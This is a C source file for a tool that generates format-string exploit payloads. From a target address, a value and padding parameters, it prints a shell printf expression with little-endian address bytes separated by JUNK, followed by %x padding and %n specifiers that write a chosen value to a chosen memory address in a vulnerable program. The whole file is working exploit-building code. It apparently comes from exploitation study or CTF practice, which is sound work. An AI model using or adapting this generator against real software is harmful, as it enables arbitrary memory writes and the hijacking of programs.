#include <stdio.h>
#include <string.h>
#include <stdlib.h>

struct arg_struct {
   int value_to_write;
   int address_to_write_to;
   int value_at_address;
   int num_format_chars;
   int happy_fields;
   int field_width;
};

void usage() {
   printf("fmt_write_to_address: -a [address to write] -v [value] -c [number of format characters] -h [number of fields that can't be exploited \"happy fields\"] -w [field width] -r [value at the address to write: required]\n");
   exit(0);
}

int construct_value(char *bytesbuf, char *argument) {
   if(strstr(argument, "0x"))
      strncpy(bytesbuf, argument + 2, 8);
   else
      strncpy(bytesbuf, argument, 8);
   
   return (int) strtol(bytesbuf, NULL, 16);
}

void write_field(int *field_address, int val) {
   *field_address = val;
}

struct arg_struct parse_args(int size, char **argv) {
   int i;
   char bytesbuf[8];
   struct arg_struct parsed_args;

   --size;

   //TODO: There is a potential for UB to be introduced here when we switch(argv[i][1])
   for(i = 1; i < size; ++i) {
      if(argv[i][0] == '-') {
         switch(argv[i][1]) {
            case 'a':
               parsed_args.address_to_write_to = construct_value(bytesbuf, argv[i + 1]);
               break;
            case 'v':
               parsed_args.value_to_write = construct_value(bytesbuf, argv[i + 1]);
               break;
            case 'c':
               parsed_args.num_format_chars = atoi(argv[i + 1]);
               break;
            case 'h':
               parsed_args.happy_fields = atoi(argv[i + 1]);
               break;
            case 'w':
               parsed_args.field_width = atoi(argv[i + 1]);
               break;
            case 'r':
               parsed_args.value_at_address = atoi(argv[i + 1]);
               break;
            default:
               break;
         }
      }
   }
   return parsed_args;
}

void print_escaped_little_endian(int val) {
   printf("\\x%02x", val & 0xFF);
   printf("\\x%02x", (val >> 8) & 0xFF);
   printf("\\x%02x", (val >> 16) & 0xFF);
   printf("\\x%02x", (val >> 24) & 0xFF);
}

void print_address_data(int address) {
   printf("$(printf \"");
   
   print_escaped_little_endian(address);
   printf("JUNK");
   print_escaped_little_endian(address + 1);
   printf("JUNK");
   print_escaped_little_endian(address + 2);
   printf("JUNK");
   print_escaped_little_endian(address + 3);

   printf("\")");
}

int get_format_width(int less_significant_byte, int more_significant_byte) {
   return (256 + (more_significant_byte - less_significant_byte));
}

void print_format_vuln_string(int val, int val_at_addr, int field_width, int happy_fields) {
   int less_sig, more_sig, i;
   
   for(i = 0; i < happy_fields; ++i)
      printf("%%x");

   less_sig = (val & 0xFF) - val_at_addr + field_width;
   printf("%%%dx%%n", less_sig);

   less_sig = val & 0xFF;
   more_sig = (val >> 8) & 0xFF;
   printf("%%%dx%%n", get_format_width(less_sig, more_sig));

   less_sig = more_sig;
   more_sig = (val >> 16) & 0xFF;
   printf("%%%dx%%n", get_format_width(less_sig, more_sig));

   less_sig = more_sig;
   more_sig = (val >> 24) & 0xFF;
   printf("%%%dx%%n", get_format_width(less_sig, more_sig));
}

int main(int argc, char **argv) {
   struct arg_struct myargs;
  
   if(argc < 13)
      usage();
   
   myargs = parse_args(argc, argv);

   print_address_data(myargs.address_to_write_to);

   print_format_vuln_string(myargs.value_to_write, myargs.value_at_address, myargs.field_width, myargs.happy_fields);

   printf("\n");

   return 0;
}
